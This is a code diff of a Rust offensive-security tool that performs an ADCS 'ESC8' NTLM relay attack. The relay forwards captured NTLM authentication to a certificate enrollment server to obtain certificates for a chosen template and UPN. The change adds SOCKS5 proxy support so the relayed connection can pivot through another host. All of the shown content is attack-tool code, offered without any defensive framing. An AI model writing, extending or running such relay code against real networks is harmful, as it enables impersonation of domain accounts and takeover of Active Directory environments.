@@ -35,6 +35,8 @@ pub struct AdcsRelayConfig {
     pub template: String,
     /// Optional UPN SANs to embed in the CSR if provided.
     pub target_upn: Option<String>,
+    /// Optional SOCKS5 proxy for outbound connections (format: `host:port`).
+    pub socks5_proxy: Option<String>,
 }
 
 /// Data structure used by this module.
@@ -78,6 +80,7 @@ impl AdcsRelay {
         let target_host = self.config.target_host.clone();
         let template = self.config.template.clone();
         let target_upn = self.config.target_upn.clone();
+        let socks5 = self.config.socks5_proxy.clone();
 
         let handle = tokio::spawn(async move {
             loop {
@@ -90,8 +93,9 @@ impl AdcsRelay {
                         let t = target_host.clone();
                         let tpl = template.clone();
                         let upn = target_upn.clone();
+                        let s5 = socks5.clone();
                         tokio::spawn(async move {
-                            if let Err(e) = handle_client(stream, t, tpl, upn).await {
+                            if let Err(e) = handle_client(stream, t, tpl, upn, s5).await {
                                 error!("ESC8 relay error: {}", e);
                             }
                         });
@@ -127,6 +131,7 @@ async fn handle_client(
     target_host: String,
     template: String,
     target_upn: Option<String>,
+    socks5_proxy: Option<String>,
 ) -> Result<()> {
     let mut buf = vec![0u8; BUF];
 
@@ -157,6 +162,7 @@ async fn handle_client(
         &target_host,
         &template,
         target_upn,
+        socks5_proxy.as_deref(),
     )
     .await
 }
@@ -168,15 +174,17 @@ async fn process_ntlm_relay(
     target_host: &str,
     template: &str,
     target_upn: Option<String>,
+    socks5_proxy: Option<&str>,
 ) -> Result<()> {
     let ntlm_b64 = strip_ntlm_prefix(negotiate_header);
 
-    // -- Connect to ADCS target ------------------------------
-    let target_addr = crate::utils::format_addr(target_host, 80);
-    let mut target = tokio::time::timeout(IO_TIMEOUT, TcpStream::connect(&target_addr))
+    // -- Connect to ADCS target (direct or via SOCKS5) ------
+    let target_sock: std::net::SocketAddr = format!("{}:80", target_host)
+        .parse()
+        .map_err(|e| RelayError::Config(format!("Invalid ADCS target address: {e}")))?;
+    let mut target = crate::utils::socks5_connect(target_sock, IO_TIMEOUT, socks5_proxy)
         .await
-        .map_err(|_| RelayError::Network(format!("Timeout connecting to {}", target_addr)))?
-        .map_err(|e| RelayError::Network(e.to_string()))?;
+        .map_err(|e| RelayError::Network(format!("ADCS connect failed: {e}")))?;
 
     let mut buf = vec![0u8; BUF];
 
